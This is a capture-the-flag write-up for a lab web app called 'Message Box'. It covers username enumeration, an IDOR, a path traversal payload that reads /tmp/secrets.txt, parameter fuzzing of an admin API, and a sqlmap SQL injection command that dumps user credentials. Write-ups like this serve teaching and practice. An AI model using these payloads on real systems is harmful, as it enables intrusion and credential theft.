# Message Box

Login page responds with different result if username is valid or username does not exists. Fuzzing with very basic usernames and passwords wordlists we soon find a bunch of username

* bob
* gill
* thomas
* admin

Once we find a valid credential we will be able to login and get the first flag.

Next we start looking at messages and we can see that

```
GET /mailbox/2/ 
```

gives us an error message, but we can still read message n. 2 by using an IDOR vulnerability here

```
GET /mailbox/2/reply/
```

We alo get a strange message

```
Hi, I've got that API Key you needed for the endpoint at /messagebox-admin-api <a href="/get_attachment?file=s
ecrets.txt&check=f4629b1e2325d367099513471d3601e0">secrets.txt</a>. I've also stored it in /tmp/secrets.txt. D
on't share it with anyone!
```

We need to find a way to access the secret message. We start noticing that the given `check` value is the md5 of `secrets.txt`.

After some struggling we deduce a valid LFI that gives us access to secrets.txt file thus revealing the needed token. Payload will use a bunch of `....//`:

```
file=....//....//....//....//....//....//....//....//tmp/secrets.txt&check=***
```

Now for last flag there is a tricky part. First of all we can fuzz /messagebox-admin-api and find a couple of endpoints:

```
deleted                 [Status: 403, Size: 32, Words: 3, Lines: 1, Duration: 40ms]
messages                [Status: 200, Size: 663, Words: 47, Lines: 1, Duration: 41ms]
```

`messages` only shows us something we already know. But accessing deleted we get an error about deprecated method. Here the trick is fuzzing for parameters in order to discover this:

```
GET /messagebox-admin-api/deleted?version=1.0 HTTP/1.1

{"message":"Here you can view messages that have been deleted"}
```

We can now access some messages but we cannot access the fourth message:

```
GET /messagebox-admin-api/deleted/4?version=1.0 HTTP/1.1
Host: u8e5yi0w.eu1.ctfio.com
X-Token: ********

{"error":"You do not have the correct permissions to view this message"}
```

There is no way to access it here but the numeric parameter in URL is vulnerable to SQLi. Easiest way to approach this is saving a request to vulnerable endpoint as `req.txt`, putting as `*` at the injection point in URL and then use this command:

```bash
sqlmap -r req.txt  --batch --force-ssl --ignore-code 401
```

We can extract the users table and find a valid credential for user admin that will give us last flag.
